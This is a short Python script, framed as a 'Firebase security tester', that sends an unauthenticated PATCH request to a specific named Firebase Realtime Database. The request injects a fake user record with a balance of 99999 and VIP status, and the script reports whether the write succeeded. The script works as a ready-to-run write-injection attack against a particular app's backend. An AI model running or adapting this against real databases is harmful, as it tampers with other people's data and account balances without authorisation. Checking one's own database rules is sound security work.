import requests
import os
import time

# --- COLORS ---
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RESET = '\033[0m'

# --- ASCII LOGO DESIGN ---
def show_banner():
    os.system('clear')
    print(f"{CYAN}")
    print(r"  ___   _      __  __   ___   ___    ___   ____ ")
    print(r" / _ \ | |    |  \/  | / _ \ | _ \  / _ \ / ___|")
    print(r"/ /_\ \| |    | |\/| || /_\ \|   / / /_\ \\___ \ ")
    print(r"|  _  || |___ | |  | ||  _  || |\ \|  _  | ___) |")
    print(r"|_| |_||_____||_|  |_||_| |_||_| \_\_| |_||____/ ")
    print(f"{YELLOW}  ==============================================")
    print(f"{WHITE}       FIREBASE SECURITY TESTER BY ALMARAS")
    print(f"{YELLOW}  =============================================={RESET}")
    print("\n")

def test_security():
    # Ang URL ng Database mo
    firebase_url = "https://jetmax-fe-default-rtdb.firebaseio.com/users/almaras_test.json"
    
    # Fake Data for Injection
    data = {
        "name": "Almaras hacks",
        "balance": 99999.0,
        "email": "hack@almaras.com",
        "isVip": True
    }

    print(f"{WHITE}[*] Checking Database Security...{RESET}")
    time.sleep(2) # Pa-epekto na loading

    try:
        response = requests.patch(firebase_url, json=data)
        
        if response.status_code == 200:
            print(f"{RED}[!] RESULT: SECURITY VULNERABLE!{RESET}")
            print(f"{RED}[!] Access Granted: almaras hack Data Injected Successfully.{RESET}")
            print(f"{YELLOW}[?] Tip: Tighten your Firebase Rules now!{RESET}")
        elif response.status_code == 401 or response.status_code == 403:
            print(f"{GREEN}[+] RESULT: SECURITY ACTIVE!{RESET}")
            print(f"{GREEN}[+] Status 403: Permission Denied (Hacker Blocked).{RESET}")
            print(f"{CYAN}[#] Good job ka streamix! Database is safe.{RESET}")
        else:
            print(f"{YELLOW}[?] Unknown Status: {response.status_code}{RESET}")
            print(response.text)

    except Exception as e:
        print(f"{RED}[-] Error connecting to database: {e}{RESET}")

# --- MAIN RUN ---
if __name__ == "__main__":
    show_banner()
    test_security()
    print(f"\n{WHITE}--- Test Finished ---{RESET}")
